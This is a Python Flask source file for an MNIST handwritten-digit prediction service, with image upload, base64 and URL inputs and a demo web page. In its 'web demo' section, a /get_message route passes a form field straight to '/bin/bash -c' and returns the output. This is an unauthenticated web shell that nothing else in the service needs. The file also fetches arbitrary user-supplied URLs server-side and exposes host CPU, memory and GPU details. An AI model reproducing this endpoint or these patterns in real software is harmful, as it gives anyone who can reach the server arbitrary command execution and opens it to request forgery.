import flask
from flask import request , render_template
import os,sys
import io
from PIL import Image
import numpy as np
import hashlib
import time
import base64
import uuid
import cv2
import json
import requests
import functools

sys.path.append("../../train_test_mnist/")
from test_mnist import MNIST


import logging
from logging.handlers import TimedRotatingFileHandler,WatchedFileHandler
from logging.handlers import RotatingFileHandler
#日志打印格式
log_fmt = '%(asctime)s\tFile \"%(filename)s\",line %(lineno)s\t%(levelname)s: %(message)s'
formatter = logging.Formatter(log_fmt)
#创建TimedRotatingFileHandler对象
#log_file_handler = TimedRotatingFileHandler(filename="logs/attribute", when="midnight", interval=1, backupCount=1000)
log_file_handler = WatchedFileHandler(filename="logs/mnist")
log_file_handler.setFormatter(formatter)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger()
#log.addHandler(log_file_handler)










mnist=MNIST()



app = flask.Flask(__name__)
@app.route("/predict", methods=["POST"])
def predict():
    t1 = time.time()
    # initialize the data dictionary that will be returned from the
    # view
    data = {"success": False}
    request_id=""
    md5=""

    try:
        # ensure an image was properly uploaded to our endpoint
        if flask.request.method == "POST":

            md5 = flask.request.form["md5"]
            request_id = flask.request.form["request_id"]
            data["md5"] = md5
            data["request_id"] = request_id

            if "image" in flask.request.files.keys():
                # read the image in PIL format
                bio = io.BytesIO()
                flask.request.files["image"].save(bio)
                file_bytes = bio.getvalue()
            elif "base64" in flask.request.form.keys():
                image_base64 = flask.request.form.get("base64")
                file_bytes = base64.urlsafe_b64decode(bytes(image_base64, encoding="utf-8"))
            elif "url" in flask.request.form.keys():
                image_url = flask.request.form["url"]
                response = requests.get(image_url)
                file_bytes = response.content

            else:
                log.error("request_id:{} field error, no field image".format(request_id))
                data["time_used"] = time.time() - t1
                return flask.jsonify(data)

            cal_md5sum = hashlib.md5(file_bytes).hexdigest()
            image = cv2.imdecode(np.frombuffer(file_bytes, dtype='uint8'), 1)
            image = cv2.resize(image,(28,28))

            if md5 == cal_md5sum:
                predict_result,predict_probability = mnist.interface(image)
                data["predict_result"] = str(predict_result[0])
                data["predict_probability"] = str(predict_probability)
                data["success"] = True
            else:
                log.error("request_id:{} md5 error, ori:{} now:{}".format(request_id, md5 ,cal_md5sum))


    except Exception as e:
        log.error("md5:{} request_id:{} exception:{}".format(md5, request_id, e))
        import traceback
        traceback.print_exc()

    
    t2 = time.time()
    log.info("TIME of {} id: {} :{} s".format(md5, request_id, t2-t1))
    data["time_used"] = t2-t1
    # return the data dictionary as a JSON response
    return flask.jsonify(data)




################
#web demo
################
@app.route('/get_message', methods=['POST'])
def get_message():
    cmd = request.form['message_cmd']
    r = os.popen('/bin/bash -c "{}"'.format(cmd))
    text = r.read()
    r.close()
    return text



def save_result(rst):
    SAVE_DIR = "./static/results/"
    session_id = str(uuid.uuid1())
    dirpath = os.path.join(SAVE_DIR, session_id)
    os.makedirs(dirpath)

    # save input image
    output_path = os.path.join(dirpath, "input.png")
    cv2.imwrite(output_path, rst["input_image"])

    # save illustration
    output_path = os.path.join(dirpath, "output.png")
    cv2.imwrite(output_path, rst["output_image"])

    # save json data
    output_path = os.path.join(dirpath, "result.json")
    with open(output_path, 'w') as f:
        json.dump(rst["output_json"], f)

    rst["session_id"] = session_id
    return rst


@functools.lru_cache(maxsize=1)
def get_host_info():
    ret = {}
    try:
        with open("/proc/cpuinfo") as f:
            ret["cpuinfo"] = f.read()

        with open("/proc/meminfo") as f:
            ret["meminfo"] = f.read()

        with open("/proc/loadavg") as f:
            ret["loadavg"] = f.read()

        ret["gpuinfo"] = os.popen("nvidia-smi").read()
    except Exception as e:
        pass

    return ret 



@app.route('/webpage')
def index():
    return render_template('index.html', session_id="dummy_session_id")

@app.route('/webpage', methods=['POST'])
def index_post():
    t1 = time.time()
    data = {"success": False}
    
    bio = io.BytesIO()
    request.files["image"].save(bio)
    image = cv2.imdecode(np.frombuffer(bio.getvalue(), dtype='uint8'), 1)
    try:
        predict_result,predict_probability = mnist.interface(image)
        data["predict_result"] = str(predict_result[0])
        data["predict_probability"] = str(predict_probability)



        data ["success"] = True
    except Exception as e:
        log.error("exception:{}".format(e))

    t2 = time.time()
    log.info("TIME: {} s".format(t2-t1))
    data["time_used"] = t2-t1
    time_lists =["1.0","2.0","3.0"]
    data["timing"] ={"read time":time_lists[0], "run time":time_lists[1], "write_time":time_lists[2]} 
    data.update(get_host_info())

    rst = {}
    rst["input_image"] = image
    rst["output_image"] = image
    rst["output_json"] = data
    save_result(rst)
    return render_template('index.html', session_id=rst["session_id"])




#支持，自动归档，多进程，进程守护
if __name__ == '__main__':
    import logging
    app.logger.setLevel(logging.DEBUG)
    app.run(host="0.0.0.0", port=5000)

